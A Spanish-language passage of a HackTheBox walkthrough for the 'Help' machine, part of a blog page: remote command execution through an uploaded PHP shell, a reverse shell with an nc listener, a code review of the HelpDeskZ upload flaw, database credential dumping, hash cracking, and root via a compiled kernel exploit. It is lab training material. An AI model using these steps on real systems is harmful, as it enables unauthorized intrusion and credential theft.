+❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=ls+-la+/tmp/rere.sh" 
+-rw-r--r-- 1 help help 133 Jul 21 25:25 /tmp/rere.sh
+</code></pre>
+
+<p>Ahora, nos ponemos en escucha por el puerto que pusimos en el archivo, en mi caso el <strong>4433</strong>:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Y finalmente ejecutamos el script que subimos:</p>
+
+<pre><code class="language-bash"># bash /tmp/rere.sh
+❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=bash+/tmp/rere.sh" 
+</code></pre>
+
+<p>Esperamos un momento yyyy en nuestro listeneeeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpRevSH.png" alt="170bash_helpRevSH" /></p>
+
+<p>Listones, estamos dentro del sistema como el usuario <strong>help</strong>, hagamos <a href="https://notes.dettlaff.xyz/recursos/tratamiento-de-la-tty">tratamiento de la TTY</a> así evitamos preocuparnos por si ejecutamos <code>CTRL+C</code>, logramos tener histórico y además conseguimos una linda Shell :P</p>
+
+<p>…</p>
+
+<p>Es muy incómodo estar colocando <code>+</code> a cada espacio cada que queramos ejecutar algo en el sistema, además de tener que movernos al final de la cadena y ay no jajaj, aprovechemos la oportunidad y creémonos un script que:</p>
+
+<ul>
+  <li>Nos encuentre el archivo con ayuda del timestamp.</li>
+  <li>Y nos permita ejecutar comandos con comodidad.</li>
+</ul>
+
+<blockquote>
+  <p>Intente hacer la creacion del ticket, pero el jugar con ese <strong>catpcha</strong> fue un poco doloroso, la mayoria de intentos son fallidos y va cambiando otro valor, así que F</p>
+</blockquote>
+
+<p>Acá se los dejo (junto al archivo que deberíamos subir):</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/help">helpdeskFind_RCE.py</a></p>
+</blockquote>
+
+<pre><code class="language-bash">❱ python3 helpdeskFind_RCE.py 
+[+] Encontrando archivo: http://10.10.10.121/support/uploads/tickets/99500535e6ed7f2de07ad7b03c5791f7.php ✔
+[+] Ejecutando id en el sistema: ✔
+
+uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
+
+[+] A r0mp3r t0do!
+</code></pre>
+
+<pre><code class="language-bash">❱ python3 helpdeskFind_RCE.py -c 'uname -a'
+[+] Ejecutando uname -a en el sistema: ✔
+
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+
+[+] A r0mp3r t0do!
+</code></pre>
+
+<p>tamos!</p>
+
+<p>…</p>
+
+<h3 id="code-review-php">Exploramos el porqué nos dejó subir archivos <u>.php</u> <a href="#code-review-php">🔗</a></h3>
+
+<p>Ya estando en la máquina intentemos buscar el código fuente de la web y ver el porqué nos dejó jugar con archivos <code>.php</code> aunque el mensaje fuera otro.</p>
+
+<p>Enumerando llegamos a los objetos que controlan las acciones del portal:</p>
+
+<pre><code class="language-bash">help@help:/var/www/html/support/controllers$ ls -la
+total 88
+drwxr-xr-x  5 root root  4096 Nov 28  2018 .
+drwxr-xr-x 11 root root  4096 Nov 27  2018 ..
+drwxr-xr-x  2 root root  4096 Jan  5  2016 admin
+drwxr-xr-x  2 root root  4096 Jan  5  2016 client
+-rw-r--r--  1 root root  1192 Jan  5  2016 home_controller.php
+-rw-r--r--  1 root root    14 Jan  5  2016 .htaccess
+-rw-r--r--  1 root root   202 Jan  5  2016 index.php
+-rw-r--r--  1 root root  6673 Jan  5  2016 knowledgebase_controller.php
+-rw-r--r--  1 root root  2575 Jan  5  2016 login_controller.php
+-rw-r--r--  1 root root  1714 Jan  5  2016 lost_password_controller.php
+-rw-r--r--  1 root root  1586 Jan  5  2016 news_controller.php
+drwxr-xr-x  3 root root  4096 Nov 27  2018 staff
+-rw-r--r--  1 root root   724 Jan  5  2016 staff_controller.php
+-rw-r--r--  1 root root 13002 Jan  5  2016 submit_ticket_controller.php
+-rw-r--r--  1 root root   422 Jan  5  2016 user_account_controller.php
+-rw-r--r--  1 root root  8772 Nov 28  2018 view_tickets_controller.php
+</code></pre>
+
+<p>Vemos <code>submit_ticket_controller.php</code>, si vamos recorriéndolo llegamos a esta parte:</p>
+
+<pre><code class="language-bash">help@help:/var/www/html/support/controllers$ cat submit_ticket_controller.php
+</code></pre>
+
+<pre><code class="language-php">...
+if(!isset($error_msg) &amp;&amp; $settings['ticket_attachment']==1){
+    $uploaddir = UPLOAD_DIR.'tickets/';
+    if($_FILES['attachment']['error'] == 0){
+        $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
+        $filename = md5($_FILES['attachment']['name'].time()).".".$ext;
+        $fileuploaded[] = array('name' =&gt; $_FILES['attachment']['name'], 'enc' =&gt; $filename, 'size' =&gt; formatBytes($_FILES['attachment']['size']), 'filetype' =&gt; $_FILES['attachment']['type']);
+        $uploadedfile = $uploaddir.$filename;
+        if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
+            $show_step2 = true;
+            $error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
+        }else{
+            $fileverification = verifyAttachment($_FILES['attachment']);
+            switch($fileverification['msg_code']){
+                case '1':
+                $show_step2 = true;
+                $error_msg = $LANG['INVALID_FILE_EXTENSION'];
+                break;
+                case '2':
+                $show_step2 = true;
+                $error_msg = $LANG['FILE_NOT_ALLOWED'];
+                break;
+                case '3':
+                $show_step2 = true;
+                $error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
+                break;
+            }
+        }
+    }
+}
+...
+</code></pre>
+
+<p>Bien, esa parte es la que toma el <code>attachment</code> (archivo adjunto) y lo procesa.</p>
+
+<p>Podemos detallar algunas cosas:</p>
+
+<ol>
+  <li>Intente buscar alguna definición de la ruta <code>UPLOAD_DIR</code>, pero al estar al lado de <code>/tickets</code>, podemos intuir que toma:
+    <ul>
+      <li><code>UPLOAD_DIR</code> como <code>http://10.10.10.121/support/uploads</code> <code>/tickets</code>.</li>
+    </ul>
+  </li>
+  <li>Vemos que extrae la extensión del objeto que subimos.</li>
+  <li>Toma el nombre del objeto, extrae la fecha actual en que esta siendo subido, junta los dos valores y los pasa a <strong>MD5</strong> (toma sentido el exploit) y le agrega la extensión.</li>
+  <li><strong>SUBE EL ARCHIVO con la función <a href="https://www.php.net/manual/es/function.move-uploaded-file.php">move_uploaded_file</a></strong>, aunque tenga errores o lo que sea que pase,</li>
+  <li><strong>PEEEEEEERO EN NINGÚN MOMENTO BORRA NADA</strong>, por eso el exploit se empeña en buscarlo, el backend no lo borra del sistema 😳</li>
+</ol>
+
+<p>Perfectisimooooooooooo, vaya fallito eh!</p>
+
+<ul>
+  <li><a href="https://www.php.net/manual/es/features.file-upload.post-method.php">Recurso para entender los tipos de <strong>$_FILES</strong></a>.</li>
+  <li><a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php">Acá el fuente de <strong>submit_ticket_controller.php</strong></a>.</li>
+</ul>
+
+<p>Pues sigamos, ya sabemos por qué podemos ver un archivo que supuestamente nos devolvía error.</p>
+
+<p>…</p>
+
+<h2 id="dump-mysql2ssh">Conseguimos credenciales para obtener una Shell con <u>SSH</u> <a href="#dump-mysql2ssh">#</a></h2>
+
+<p>Enumerando los directorios desde donde salimos hacia atrás, encontramos un objeto llamado <code>config.php</code> en la carpeta <code>/includes</code>:</p>
+
+<pre><code class="language-bash">help@help:/var/www/html/support/includes$ ls -la
+total 152
+...
+-rwxrwxrwx  1 root root   274 Nov 27  2018 config.php
+...
+</code></pre>
+
+<p>Si vemos su contenido encontramos unas credenciales contra la base de datos <code>support</code>:</p>
+
+<pre><code class="language-bash">help@help:/var/www/html/support/includes$ cat config.php 
+&lt;?php
+        $config['Database']['dbname'] = 'support';
+        $config['Database']['tableprefix'] = '';
+        $config['Database']['servername'] = 'localhost';
+        $config['Database']['username'] = 'root';
+        $config['Database']['password'] = 'helpme';
+        $config['Database']['type'] = 'mysqli';
+?&gt;
+</code></pre>
+
+<p>Pues perfecto, tomémoslas y probemos si son válidas:</p>
+
+<ul>
+  <li><code>root</code> : <code>helpme</code></li>
+</ul>
+
+<p>…</p>
+
+<h3 id="dump-db-mysql">Empezamos a dumpear la base de datos <u>support</u> <a href="#dump-db-mysql">🔗</a></h3>
+
+<hr />
+
+<pre><code class="language-bash">help@help:/var/www/html/support/includes$ mysql -u root -p
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_mysqlDone.png" alt="170bash_helpSH_mysqlDone" /></p>
+
+<p>Si señores, tamos dentro de <strong>MySQL</strong> con las credenciales de <strong>root</strong>, veamos si hay algo útil:</p>
+
+<blockquote>
+  <p>Probando las credenciales contra <strong>SSH</strong> no logramos nada, solo son validas en <strong>MySQL</strong>.</p>
+</blockquote>
+
+<p>Veamos que bases de datos hay:</p>
+
+<pre><code class="language-sql">mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| support            |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+</code></pre>
+
+<p>Las 4 de siempre, enfoquémonos en <code>support</code>, usémosla y veamos sus tablas:</p>
+
+<pre><code class="language-sql">mysql&gt; use support;
+</code></pre>
+
+<pre><code class="language-sql">mysql&gt; show tables;
++------------------------+
+| Tables_in_support      |
++------------------------+
+| articles               |
+| attachments            |
+| canned_response        |
+| custom_fields          |
+| departments            |
+| emails                 |
+| error_log              |
+| file_types             |
+| knowledgebase_category |
+| login_attempt          |
+| login_log              |
+| news                   |
+| pages                  |
+| priority               |
+| settings               |
+| staff                  |
+| tickets                |
+| tickets_messages       |
+| users                  |
++------------------------+
+19 rows in set (0.00 sec)
+</code></pre>
+
+<p>Uff, varios nombres llamativos:</p>
+
+<ul>
+  <li><code>login_log</code></li>
+  <li><code>settings</code></li>
+  <li><code>staff</code></li>
+  <li><code>tickets</code></li>
+  <li><code>tickets_messages</code></li>
+  <li><code>users</code></li>
+</ul>
+
+<p>Primero veamos si hay algo llamativo en <code>users</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_mysql_userstable.png" alt="170bash_helpSH_mysql_userstable" /></p>
+
+<p>Bien, varios intentos míos 🥴, pero además hay un usuario nuevo, <code>helpme</code>… Si tomamos cualquier contraseña (hash) y <a href="https://www.tunnelsup.com/hash-analyzer/">validamos su formato</a> vemos que son tipo <code>SHA1 (or SHA 128)</code>.</p>
+
+<p>Pues apoyémonos de <strong>JtR</strong> (<code>John The Ripper</code>) para intentar crackear ese hash, guardémoslo en un archivo y ejecutemos:</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt helpme.hash 
+...
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+godhelpmeplz     (?)
+1g 0:00:00:00 DONE (2021-07-21 18:19) 1.176g/s 9220Kp/s 9220Kc/s 9220KC/s godhibiki..godhelpmee
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>OPA, encontramos una coincidencia, la contraseña en texto plano es <code>godhelpmeplz</code> :o</p>
+
+<p>En teoría estas credenciales son válidas contra el servidor web, o sea, contra el login (<strong>si lo son 😎</strong>). Pero probando contra <strong>SSH</strong> ya sea con <code>root</code> o <code>help</code> no son funcionales :(</p>
+
+<p>…</p>
+
+<h3 id="dump-db-mysql-staff">Seguimos dumpeando y encontramos nuevas credenciales <a href="#dump-db-mysql-staff">🔗</a></h3>
+
+<p>Veamos si hay algo en las otras tablas…</p>
+
+<p>Jugando llegamos a la data de la tabla <code>staff</code>:</p>
+
+<pre><code class="language-sql">mysql&gt; SELECT * FROM staff;
+</code></pre>
+
+<p>Encontramos varios campos y data juguetona, filtremos por los interesantes:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_mysql_stafftable.png" alt="170bash_helpSH_mysql_stafftable" /></p>
+
+<p>Otras credenciales, ahora hacen referencia a un usuario llamado <strong>admin</strong>, tomemos la pw y hagamos el mismo procedimiento de antes a ver si conseguimos algo:</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash 
+...
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Welcome1         (?)
+1g 0:00:00:00 DONE (2021-07-21 18:34) 4.545g/s 183636p/s 183636c/s 183636C/s abygail..Thomas1
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>También hay coincidencias, si probamos de nuevo contra <strong>SSH</strong> logramos una sesión como el usuario <strong>help</strong>:</p>
+
+<pre><code class="language-bash">❱ ssh help@10.10.10.121
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_ssh_done.png" alt="170bash_helpSH_ssh_done" /></p>
+
+<p>Así que ya podemos olvidarnos de la <strong>reverse Shell</strong> y quedarnos con la nueva <strong>SSH</strong> (:</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<blockquote>
+  <p>Enumerando el sistema cai en varios <strong>rabbit hole</strong> al no buscar primero cosas esenciales :( uno con <code>exim4</code>, otro con <code>graphql</code>, con <code>js</code>, bueno, algunas perdidas e.e</p>
+</blockquote>
+
+<p>Viendo las características del sistema nos encontramos la versión del kernel:</p>
+
+<pre><code class="language-bash">help@help:/tmp$ uname -a
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+
+<p>Si buscamos en la web alguna vulnerabilidad relacionada la versión <code>4.4.0-116-generic</code> caemos a este recurso:</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/44298">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation</a>.</li>
+</ul>
+
+<p>Una explotación al <a href="https://www.ediciones-eni.com/open/mediabook.aspx?idR=8a12dad1db3537bb61f40e77e94e0142">kernel</a> que despues de jugar con huecos en la memoria, shellcodes y cositas nos debería devolver una <code>/bin/bash</code> siempre y cuando seamos <strong>root</strong> (despues de toodo el proceso que hace):</p>
+
+<pre><code class="language-c">...
+    if (getuid() == 0) {
+        printf("spawning root shell\n");
+        system("/bin/bash");
+        exit(0);
+...
+</code></pre>
+
+<p>Pues intentemos usarlo, veamos si la máquina tiene <code>gcc</code> para compilarlo, o si no lo compilamos en nuestra máquina y despues lo subimos:</p>
+
+<pre><code class="language-bash">help@help:/tmp$ which gcc
+/usr/bin/gcc
+</code></pre>
+
+<p>Listos, existe, así que copiamos el código del exploit y movámoslo a la máquina víctima:</p>
+
+<pre><code class="language-bash">help@help:/tmp/keke$ file kerLokhe.c 
+kerLokhe.c: C source, ASCII text, with CRLF line terminators
+</code></pre>
+
+<p>Ahora compilémoslo para generar el ejecutable:</p>
+
+<pre><code class="language-bash">help@help:/tmp/keke$ gcc kerLokhe.c -o kerLokhe
+</code></pre>
+
+<pre><code class="language-bash">help@help:/tmp/keke$ file kerLokhe
+kerLokhe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e3143a5446c02fb5b32c79eaf037488a003040af, not stripped
+</code></pre>
+
+<p>Listo, pues ejecutémoslo:</p>
+
+<pre><code class="language-bash">help@help:/tmp/keke$ ./kerLokhe
+</code></pre>
+
+<p>Instantáneamente veeeeeeeeemooooooooooooooooooooos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_kernelExploit_done.png" alt="170bash_helpSH_kernelExploit_done" /></p>
+
+<p>Y conseguimos nuestra dichosa <code>/bin/bash</code> como el usuario <code>root</code> (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170google_gif_dancebeer.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Veamos las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170flags.png" alt="170flags" /></p>
+
+<p>…</p>
+
+<p>Linda máquina, completica de <strong>vulnerabilidades conocidas (<code>CVEs</code>)</strong>, lo cual está brutal, ya que apunta a ser lo más real (y lo es).</p>
+
+<p>Muchas gracias por leer y como siempre, A S3GU1R R0MP1ENDO 7ODO!!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Help&url=http://localhost:4000/htb/help" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#HelpDeskZ">HelpDeskZ</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#file-upload">file-upload</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#kernel-exploit">kernel-exploit</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#ticket-support">ticket-support</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/optimum">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6banner.png" alt="HackTheBox - Optimum"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/optimum">HackTheBox - Optimum</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil. Evitamos los filtros que nos ponga HTTP File Server, transformamos (transformers (optimus prime (optimum (nombre bien pensado eh!)))) nuestra arquitectura y explotamos el siempre triste kernel....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/bastard">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png" alt="HackTheBox - Bastard"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/bastard">HackTheBox - Bastard</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio, vamos a romper Drupal 7.54 y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio SeImpersonate y de JuicyPotato o explotando el lindo...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/love">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344banner.png" alt="HackTheBox - Love"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/love">HackTheBox - Love</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil, escanearemos archivos locales (localhost) en busca de malware e.e Encontraremos credenciales y generaremos votantes con fotos de perfil peligrosas… Jugaremos con registros e instalaremos paquetes MSI...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">07 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
